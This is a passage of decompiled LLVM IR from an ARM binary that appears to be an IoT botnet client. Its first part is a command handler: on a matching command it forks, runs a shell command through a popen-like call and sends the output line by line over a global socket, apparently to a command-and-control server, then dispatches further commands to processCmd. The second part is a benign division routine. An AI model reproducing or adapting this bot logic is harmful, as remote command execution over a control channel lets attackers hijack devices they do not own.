  br i1 %v2_eec8, label %dec_label_pc_eed0, label %dec_label_pc_eea4

dec_label_pc_eed0:                                ; preds = %dec_label_pc_eea4, %dec_label_pc_eec0, %dec_label_pc_ee98
  %stack_var_-64.0.lcssa = phi i8* [ %v5_ee10, %dec_label_pc_ee98 ], [ %v5_eeac, %dec_label_pc_eea4 ], [ %stack_var_-64.033, %dec_label_pc_eec0 ]
  %v4_eeb0.lcssa = phi i32 [ %v1_ee0c, %dec_label_pc_ee98 ], [ %v1_eea8, %dec_label_pc_eea4 ], [ %v4_eeb034, %dec_label_pc_eec0 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_eee0 = add i32 %v4_eeb0.lcssa, 1
  %v2_ef2439 = load i8, i8* %v5_ee10, align 1
  %v2_ef2841 = icmp eq i8 %v2_ef2439, 0
  br i1 %v2_ef2841, label %dec_label_pc_ef30, label %dec_label_pc_eef4

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eed0, %dec_label_pc_eef4
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_eef4 ], [ %v5_ee10, %dec_label_pc_eed0 ]
  %storemerge1442 = phi i32 [ %v1_ef18, %dec_label_pc_eef4 ], [ %v1_ee0c, %dec_label_pc_eed0 ]
  %v2_eef8 = load i8, i8* %storemerge743, align 1
  %v3_eef8 = zext i8 %v2_eef8 to i32
  %v1_ef00 = call i32 @__GI_toupper(i32 %v3_eef8)
  %v1_ef10 = trunc i32 %v1_ef00 to i8
  store i8 %v1_ef10, i8* %storemerge743, align 1
  %v1_ef18 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_ef18 to i8*
  %v2_ef24 = load i8, i8* %storemerge7, align 1
  %v2_ef28 = icmp eq i8 %v2_ef24, 0
  br i1 %v2_ef28, label %dec_label_pc_ef30, label %dec_label_pc_eef4

dec_label_pc_ef30:                                ; preds = %dec_label_pc_eef4, %dec_label_pc_eed0
  store i32 ptrtoint ([11 x i8]* @global_var_19a10.570 to i32), i32* @r1, align 4
  %v4_ef3c = call i32 @__GI_strcoll(i8* %v5_ee10, i32 ptrtoint ([11 x i8]* @global_var_19a10.570 to i32))
  %v2_ef44 = icmp eq i32 %v4_ef3c, 0
  br i1 %v2_ef44, label %dec_label_pc_ef4c, label %dec_label_pc_f054

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef30
  %v0_ef4c = call i32 @listFork()
  %v2_ef54 = icmp eq i32 %v0_ef4c, 0
  br i1 %v2_ef54, label %dec_label_pc_ef5c, label %dec_label_pc_f1ec.outer

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef4c
  store i32 1024, i32* @r2, align 4
  %v3_ef74 = call i32 @__GI_memset(i8* %v2_ef74, i32 0)
  %v11_ef94 = call i32 @szprintf(i32 %v2_ef64, i32 ptrtoint ([8 x i8]* @global_var_19a1c.572 to i32), i32 %v1_eee0, i32 %v2_ef64, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_efb0 = call i32 @fdpopen(i32 %v2_ef64, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1994c.545, i32 0, i32 0))
  br label %dec_label_pc_f01c

dec_label_pc_efc0:                                ; preds = %dec_label_pc_f01c
  %v2_efd0 = call i32 @trim(i8* %v2_ef74)
  %v2_efd8 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_ef64, i32* @r2, align 4
  %v3_eff4 = call i32 @Rootsprintf(i32 %v2_efd8, i32 ptrtoint ([3 x i8]* @global_var_19a24.574 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_f010 = call i32 @__GI_memset(i8* %v2_ef74, i32 0)
  %v1_f018 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f01c

dec_label_pc_f01c:                                ; preds = %dec_label_pc_ef5c, %dec_label_pc_efc0
  %v4_f034 = call i32 @fdgets(i32 %v2_ef64, i32 1024, i32 %v3_efb0, i32 %v2_ef64)
  %v2_f03c = icmp eq i32 %v4_f034, 0
  br i1 %v2_f03c, label %dec_label_pc_f044, label %dec_label_pc_efc0

dec_label_pc_f044:                                ; preds = %dec_label_pc_f01c
  %v1_f048 = call i32 @fdpclose(i32 %v3_efb0)
  %v1_f050 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f054

dec_label_pc_f054:                                ; preds = %dec_label_pc_ef30, %dec_label_pc_f044
  store i32 %v1_eee0, i32* @r0, align 4
  %v2_f068 = call i32 @__GI_strtok(i32 %v1_eee0, i32 ptrtoint (i32* @global_var_19a28.576 to i32))
  store i32 %v1_ee0c, i32* %stack_var_-624, align 4
  %v2_f17046 = icmp eq i32 %v2_f068, 0
  br i1 %v2_f17046, label %dec_label_pc_f178, label %dec_label_pc_f080

dec_label_pc_f080:                                ; preds = %dec_label_pc_f054, %dec_label_pc_f158
  %stack_var_-36.049.in = phi i32 [ %v2_f160, %dec_label_pc_f158 ], [ %v2_f068, %dec_label_pc_f054 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f158 ], [ 1, %dec_label_pc_f054 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_f084 = load i8, i8* %stack_var_-36.049, align 1
  %v7_f088 = icmp eq i8 %v2_f084, 10
  br i1 %v7_f088, label %dec_label_pc_f158, label %dec_label_pc_f090

dec_label_pc_f090:                                ; preds = %dec_label_pc_f080
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_f09c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f0a4 = add i32 %v3_f09c, 1
  %v1_f0ac = call i32 @malloc(i32 %v1_f0a4)
  %v0_f0c0 = load i32, i32* @r4, align 4
  %v3_f0c0 = mul i32 %v0_f0c0, 4
  %v2_f0cc = add i32 %v2_f0c8, %v3_f0c0
  %v2_f0d0 = inttoptr i32 %v2_f0cc to i32*
  store i32 %v1_f0ac, i32* %v2_f0d0, align 4
  %v3_f0e0 = mul i32 %stack_var_-40.147, 4
  %v2_f0e8 = add i32 %v3_f0e0, %v19_e5d4
  %v2_f0ec = add i32 %v2_f0e8, -600
  %v1_f0f0 = inttoptr i32 %v2_f0ec to i32*
  %v2_f0f0 = load i32, i32* %v1_f0f0, align 4
  store i32 %v2_f0f0, i32* @r4, align 4
  %v3_f0fc = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f104 = add i32 %v3_f0fc, 1
  %v0_f108 = load i32, i32* @r4, align 4
  store i32 %v1_f104, i32* @r2, align 4
  %v2_f118 = inttoptr i32 %v0_f108 to i8*
  %v3_f118 = call i32 @__GI_memset(i8* %v2_f118, i32 0)
  %v2_f138 = load i32, i32* %v1_f0f0, align 4
  %v4_f148 = call i32 @strcpy(i32 %v2_f138, i8* nonnull %stack_var_-36.049)
  %v1_f150 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f080, %dec_label_pc_f090
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_f080 ], [ %v1_f150, %dec_label_pc_f090 ]
  store i32 0, i32* @r0, align 4
  %v2_f160 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19a28.576 to i32))
  %v2_f170 = icmp eq i32 %v2_f160, 0
  br i1 %v2_f170, label %dec_label_pc_f178, label %dec_label_pc_f080

dec_label_pc_f178:                                ; preds = %dec_label_pc_f158, %dec_label_pc_f054
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_f054 ], [ %stack_var_-40.0, %dec_label_pc_f158 ]
  %v3_f184 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f190 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f190, label %dec_label_pc_f1ec.outer, label %dec_label_pc_f1a8.lr.ph

dec_label_pc_f1a8.lr.ph:                          ; preds = %dec_label_pc_f178
  br label %dec_label_pc_f1a8

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_f1a8.lr.ph, %dec_label_pc_f1a8
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_f1a8.lr.ph ], [ %v1_f1d4, %dec_label_pc_f1a8 ]
  %v3_f1b4 = mul i32 %storemerge15127, 4
  %v2_f1bc = add i32 %v3_f1b4, %v19_e5d4
  %v2_f1c0 = add i32 %v2_f1bc, -600
  %v1_f1c4 = inttoptr i32 %v2_f1c0 to i32*
  %v2_f1c4 = load i32, i32* %v1_f1c4, align 4
  store i32 %v2_f1c4, i32* @r0, align 4
  %v0_f1cc = call i32 @free()
  %v1_f1d4 = add nuw nsw i32 %storemerge15127, 1
  %v5_f1e8 = icmp slt i32 %v1_f1d4, %stack_var_-40.1.lcssa
  br i1 %v5_f1e8, label %dec_label_pc_f1a8, label %dec_label_pc_f1ec.outer

dec_label_pc_f1ec.outer:                          ; preds = %dec_label_pc_f1a8, %dec_label_pc_ed6c, %dec_label_pc_ef4c, %dec_label_pc_f178, %dec_label_pc_edc8, %dec_label_pc_e97c
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_e97c ], [ %stack_var_-96.1, %dec_label_pc_edc8 ], [ %stack_var_-96.1, %dec_label_pc_f178 ], [ %stack_var_-96.1, %dec_label_pc_ef4c ], [ %stack_var_-96.1, %dec_label_pc_ed6c ], [ %stack_var_-96.1, %dec_label_pc_f1a8 ]
  br label %dec_label_pc_f1ec

dec_label_pc_f1ec:                                ; preds = %dec_label_pc_f1ec.outer, %dec_label_pc_ecf8
  %v2_f1f0 = load i32, i32* @global_var_24170.48, align 4
  %v5_f20c = call i32 @recvLine(i32 %v2_f1f0, i8* %v4_f20c, i32 4096, i32 %v2_f1fc)
  %v3_f21c = icmp eq i32 %v5_f20c, -1
  br i1 %v3_f21c, label %dec_label_pc_e960.outer, label %dec_label_pc_ec28

; uselistorder directives
  uselistorder i32 %v5_f20c, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f160, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_ef18, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_eee0, { 1, 2, 0 }
  uselistorder i32 %v2_ee58, { 1, 2, 0 }
  uselistorder i8* %v5_ee10, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_ee0c, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_ed44, { 1, 2, 0 }
  uselistorder i1 %v9_ec5c, { 1, 0 }
  uselistorder i32 %v3_ec70, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_eba8, { 1, 0 }
  uselistorder i32 %v3_ebdc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_eb50, { 1, 0 }
  uselistorder i32 %v1_eb34, { 1, 0 }
  uselistorder i32 %v5_ea78, { 1, 0 }
  uselistorder i32 %v1_ea08, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_ef64, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_f20c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f1fc, { 8, 2, 4, 3, 6, 5, 7, 0, 1 }
  uselistorder i32 %v3_e870, { 1, 0, 2 }
  uselistorder i32 %v2_e7d4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_24178.66, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2a3fc.69, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 1, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 16, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_2a3f0.80, { 0, 2, 1 }
  uselistorder i32* @global_var_24170.48, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 4, 3, 0 }
  uselistorder [2 x i8]* @global_var_1994c.545, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1994c.545 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @srand, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 20, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 18, 19 }
  uselistorder label %dec_label_pc_f1ec.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f1a8, { 1, 0 }
  uselistorder label %dec_label_pc_f158, { 1, 0 }
  uselistorder label %dec_label_pc_f080, { 1, 0 }
  uselistorder label %dec_label_pc_f054, { 1, 0 }
  uselistorder label %dec_label_pc_f01c, { 1, 0 }
  uselistorder label %dec_label_pc_eef4, { 1, 0 }
  uselistorder label %dec_label_pc_eed0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eec0, { 1, 0 }
  uselistorder label %dec_label_pc_ee40, { 1, 0 }
  uselistorder label %dec_label_pc_eda8, { 1, 0 }
  uselistorder label %dec_label_pc_ed6c, { 1, 0 }
  uselistorder label %dec_label_pc_ec94, { 1, 0 }
  uselistorder label %dec_label_pc_ec1c, { 1, 0 }
  uselistorder label %dec_label_pc_eb8c, { 1, 0 }
  uselistorder label %dec_label_pc_ea5c, { 1, 0 }
  uselistorder label %dec_label_pc_e970, { 1, 0 }
  uselistorder label %dec_label_pc_e960.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e944, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e8b8, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_e790, { 1, 0 }
  uselistorder label %dec_label_pc_e71c, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f27c = add i32 %arg2, -1
  %v7_f27c = icmp eq i32 %arg2, 1
  br i1 %v7_f27c, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_f280 = load i32, i32* @r0, align 4
  ret i32 %v2_f280

bb80:                                             ; preds = %entry
  %v2_f27c = icmp eq i32 %arg2, 0
  br i1 %v2_f27c, label %dec_label_pc_f364, label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %bb80
  %v0_f288 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_f288, %arg2
  br i1 %tmp, label %dec_label_pc_f290, label %dec_label_pc_f31c

dec_label_pc_f290:                                ; preds = %dec_label_pc_f288
  %v2_f290 = and i32 %v1_f27c, %arg2
  %v4_f290 = icmp eq i32 %v2_f290, 0
  br i1 %v4_f290, label %dec_label_pc_f328, label %dec_label_pc_f298

dec_label_pc_f298:                                ; preds = %dec_label_pc_f290
  %v3_f298 = icmp ult i32 %arg2, 536870912
  br i1 %v3_f298, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_f298
  %v4_f29c = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_f298, %.thread
  %v0_f2bc.pr36.ph = phi i32 [ %v4_f29c, %.thread ], [ %arg2, %dec_label_pc_f298 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_f298 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_f2bc.pr36 = phi i32 [ %v4_f2b0, %bb83 ], [ %v0_f2bc.pr36.ph, %.preheader.preheader ]
  %v1_f2b4 = phi i32 [ %v4_f2b4, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_f2a8 = icmp ugt i32 %v0_f2bc.pr36, 268435455
  br i1 %v2_f2a8, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_f2bcthread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_f2ac = icmp ult i32 %v0_f2bc.pr36, %v0_f288
  br i1 %v4_f2ac, label %bb82, label %dec_label_pc_f2bcthread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_f2b0 = and i32 %v0_f2bc.pr36, 268435456
  %v3_f2b0 = icmp eq i32 %v2_f2b0, 0
  %v4_f2b0 = mul i32 %v0_f2bc.pr36, 16
  br i1 %v3_f2b0, label %bb83, label %dec_label_pc_f2bc.loopexit

bb83:                                             ; preds = %bb82
  %v2_f2b4 = and i32 %v1_f2b4, 268435456
  %v3_f2b4 = icmp eq i32 %v2_f2b4, 0
  %v4_f2b4 = mul i32 %v1_f2b4, 16
  br i1 %v3_f2b4, label %.preheader, label %dec_label_pc_f2bcthread-pre-split.loopexit.loopexit

dec_label_pc_f2bcthread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_f2c848.ph = phi i32 [ %v1_f2b4, %bb81 ], [ %v4_f2b4, %bb83 ]
  %v0_f2bc.pr38.ph = phi i32 [ %v0_f2bc.pr36, %bb81 ], [ %v4_f2b0, %bb83 ]
  br label %dec_label_pc_f2bcthread-pre-split.loopexit

dec_label_pc_f2bcthread-pre-split.loopexit:       ; preds = %dec_label_pc_f2bcthread-pre-split.loopexit.loopexit, %.thread2
  %v1_f2c848 = phi i32 [ %v1_f2b4, %.thread2 ], [ %v1_f2c848.ph, %dec_label_pc_f2bcthread-pre-split.loopexit.loopexit ]
  %v0_f2bc.pr38 = phi i32 [ %v0_f2bc.pr36, %.thread2 ], [ %v0_f2bc.pr38.ph, %dec_label_pc_f2bcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f2bcthread-pre-split

dec_label_pc_f2bcthread-pre-split:                ; preds = %dec_label_pc_f2bcthread-pre-split.loopexit, %bb85
  %v1_f2c846 = phi i32 [ %v1_f2c848, %dec_label_pc_f2bcthread-pre-split.loopexit ], [ %v3_f2c8, %bb85 ]
  %v0_f2bc.pr = phi i32 [ %v0_f2bc.pr38, %dec_label_pc_f2bcthread-pre-split.loopexit ], [ %v3_f2c4, %bb85 ]
  br label %dec_label_pc_f2bc

dec_label_pc_f2bc.loopexit:                       ; preds = %bb82
  br label %dec_label_pc_f2bc

dec_label_pc_f2bc:                                ; preds = %dec_label_pc_f2bc.loopexit, %dec_label_pc_f2bcthread-pre-split
  %v1_f2c8 = phi i32 [ %v1_f2c846, %dec_label_pc_f2bcthread-pre-split ], [ %v1_f2b4, %dec_label_pc_f2bc.loopexit ]
  %v1_f2c4 = phi i32 [ %v0_f2bc.pr, %dec_label_pc_f2bcthread-pre-split ], [ %v4_f2b0, %dec_label_pc_f2bc.loopexit ]
  %v2_f2bc = icmp slt i32 %v1_f2c4, 0
  br i1 %v2_f2bc, label %dec_label_pc_f2d0, label %bb84

bb84:                                             ; preds = %dec_label_pc_f2bc
  %v4_f2c0 = icmp ult i32 %v1_f2c4, %v0_f288
  br i1 %v4_f2c0, label %bb85, label %dec_label_pc_f2d0

bb85:                                             ; preds = %bb84
  %v3_f2c4 = mul i32 %v1_f2c4, 2
  %v2_f2c8 = icmp slt i32 %v1_f2c8, 0
  %v3_f2c8 = mul i32 %v1_f2c8, 2
  br i1 %v2_f2c8, label %dec_label_pc_f2d0, label %dec_label_pc_f2bcthread-pre-split

dec_label_pc_f2d0:                                ; preds = %bb84, %dec_label_pc_f2bc, %bb85
  %v2_f2dc59 = phi i32 [ %v3_f2c8, %bb85 ], [ %v1_f2c8, %bb84 ], [ %v1_f2c8, %dec_label_pc_f2bc ]
  %v1_f2d451 = phi i32 [ %v3_f2c4, %bb85 ], [ %v1_f2c4, %bb84 ], [ %v1_f2c4, %dec_label_pc_f2bc ]
  br label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %.thread11, %dec_label_pc_f2d0
  %v1_f308 = phi i32 [ %v4_f308, %.thread11 ], [ %v2_f2dc59, %dec_label_pc_f2d0 ]
  %v1_f2dc = phi i32 [ %v0_f314, %.thread11 ], [ 0, %dec_label_pc_f2d0 ]
  %v1_f30c = phi i32 [ %v4_f30c, %.thread11 ], [ %v1_f2d451, %dec_label_pc_f2d0 ]
  %v1_f2d8 = phi i32 [ %v0_f304, %.thread11 ], [ %v0_f288, %dec_label_pc_f2d0 ]
  %v3_f2d4 = icmp ult i32 %v1_f2d8, %v1_f30c
  br i1 %v3_f2d4, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_f2d4
  %v3_f2d8 = sub i32 %v1_f2d8, %v1_f30c
  %v3_f2dc = or i32 %v1_f2dc, %v1_f308
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_f2d4, %bb86
  %v1_f2e4 = phi i32 [ %v1_f2d8, %dec_label_pc_f2d4 ], [ %v3_f2d8, %bb86 ]
  %v1_f2e8 = phi i32 [ %v1_f2dc, %dec_label_pc_f2d4 ], [ %v3_f2dc, %bb86 ]
  %v4_f2e0 = udiv i32 %v1_f30c, 2
  %v6_f2e0 = icmp ult i32 %v1_f2e4, %v4_f2e0
  br i1 %v6_f2e0, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_f2e4 = urem i32 %v1_f30c, 2
  %v4_f2e4 = icmp eq i32 %v3_f2e4, 0
  %v6_f2e4 = sub i32 %v1_f2e4, %v4_f2e0
  br i1 %v4_f2e4, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_f2e8 = udiv i32 %v1_f308, 2
  %v6_f2e8 = or i32 %v1_f2e8, %v5_f2e8
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_f2f0 = phi i32 [ %v6_f2e4, %bb87 ], [ %v1_f2e4, %.thread7 ], [ %v6_f2e4, %bb88 ]
  %v1_f2f4 = phi i32 [ %v1_f2e8, %bb87 ], [ %v1_f2e8, %.thread7 ], [ %v6_f2e8, %bb88 ]
  %v4_f2ec = udiv i32 %v1_f30c, 4
  %v6_f2ec = icmp ult i32 %v1_f2f0, %v4_f2ec
  br i1 %v6_f2ec, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_f2f0 = and i32 %v1_f30c, 2
  %v4_f2f0 = icmp eq i32 %v3_f2f0, 0
  %v6_f2f0 = sub i32 %v1_f2f0, %v4_f2ec
  br i1 %v4_f2f0, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_f2f4 = udiv i32 %v1_f308, 4
  %v6_f2f4 = or i32 %v1_f2f4, %v5_f2f4
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_f2fc = phi i32 [ %v6_f2f0, %bb89 ], [ %v1_f2f0, %.thread8 ], [ %v6_f2f0, %bb90 ]
  %v1_f300 = phi i32 [ %v1_f2f4, %bb89 ], [ %v1_f2f4, %.thread8 ], [ %v6_f2f4, %bb90 ]
  %v4_f2f8 = udiv i32 %v1_f30c, 8
  %v6_f2f8 = icmp ult i32 %v1_f2fc, %v4_f2f8
  br i1 %v6_f2f8, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_f2fc = and i32 %v1_f30c, 4
  %v4_f2fc = icmp eq i32 %v3_f2fc, 0
  %v6_f2fc = sub i32 %v1_f2fc, %v4_f2f8
  br i1 %v4_f2fc, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_f300 = udiv i32 %v1_f308, 8
  %v6_f300 = or i32 %v1_f300, %v5_f300
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_f314 = phi i32 [ %v1_f300, %bb91 ], [ %v1_f300, %.thread9 ], [ %v6_f300, %bb92 ]
  %v0_f304 = phi i32 [ %v6_f2fc, %bb91 ], [ %v1_f2fc, %.thread9 ], [ %v6_f2fc, %bb92 ]
  %v2_f304 = icmp eq i32 %v0_f304, 0
  br i1 %v2_f304, label %dec_label_pc_f314, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_f308, 16
  br i1 %tmp140, label %dec_label_pc_f314, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_f308 = udiv i32 %v1_f308, 16
  %v4_f30c = udiv i32 %v1_f30c, 16
  br label %dec_label_pc_f2d4

dec_label_pc_f314:                                ; preds = %thread-pre-split, %bb93
  ret i32 %v0_f314

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f288
  %v9_f288 = icmp eq i32 %v0_f288, %arg2
  %. = zext i1 %v9_f288 to i32
  ret i32 %.

dec_label_pc_f328:                                ; preds = %dec_label_pc_f290
  %v2_f328 = icmp ugt i32 %arg2, 65535
  br i1 %v2_f328, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_f328
  %v2_f32c = and i32 %arg2, 32768
  %v3_f32c = icmp eq i32 %v2_f32c, 0
  %v4_f32c = udiv i32 %arg2, 65536
  br i1 %v3_f32c, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_f328
  %v0_f33865 = phi i32 [ %arg2, %dec_label_pc_f328 ], [ %v4_f32c, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_f33c = phi i32 [ %v0_f33865, %.thread16 ], [ %v4_f32c, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_f338 = icmp ugt i32 %v1_f33c, 255
  br i1 %v2_f338, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_f33c = and i32 %v1_f33c, 128
  %v3_f33c = icmp eq i32 %v2_f33c, 0
  %v4_f33c = udiv i32 %v1_f33c, 256
  br i1 %v3_f33c, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_f340 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_f34c = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_f340, %bb100 ]
  %v1_f348 = phi i32 [ %v1_f33c, %bb98 ], [ %v4_f33c, %bb99 ], [ %v4_f33c, %bb100 ]
  %v2_f344 = icmp ugt i32 %v1_f348, 15
  br i1 %v2_f344, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_f348 = and i32 %v1_f348, 8
  %v3_f348 = icmp eq i32 %v2_f348, 0
  %v4_f348 = udiv i32 %v1_f348, 16
  br i1 %v3_f348, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_f34c = add nsw i32 %v1_f34c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_f354 = phi i32 [ %v1_f34c, %.thread17 ], [ %v1_f34c, %bb101 ], [ %v2_f34c, %bb102 ]
  %v5_f358 = phi i32 [ %v1_f348, %.thread17 ], [ %v4_f348, %bb101 ], [ %v4_f348, %bb102 ]
  %v2_f350 = icmp ugt i32 %v5_f358, 3
  %v7_f350 = icmp eq i32 %v5_f358, 4
  %v2_f354 = xor i1 %v7_f350, true
  %v3_f354 = and i1 %v2_f350, %v2_f354
  br i1 %v3_f354, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_f354 = add nsw i32 %v4_f354, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_f358 = phi i32 [ %v4_f354, %.thread18 ], [ %v5_f354, %bb103 ]
  %v2_f358 = xor i1 %v2_f350, true
  %v3_f358 = or i1 %v7_f350, %v2_f358
  br i1 %v3_f358, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_f358 = udiv i32 %v5_f358, 2
  %v9_f358 = add i32 %v4_f358, %v8_f358
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_f35c = phi i32 [ %v4_f358, %bb104 ], [ %v9_f358, %bb105 ]
  %v6_f35c = lshr i32 %v0_f288, %v1_f35c
  ret i32 %v6_f35c

dec_label_pc_f364:                                ; preds = %bb80
  %v0_f364 = load i32, i32* @lr, align 4
  %v0_f368 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f364)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_f358, { 1, 0 }
  uselistorder i1 %v7_f350, { 1, 0 }
  uselistorder i32 %v4_f348, { 1, 0 }
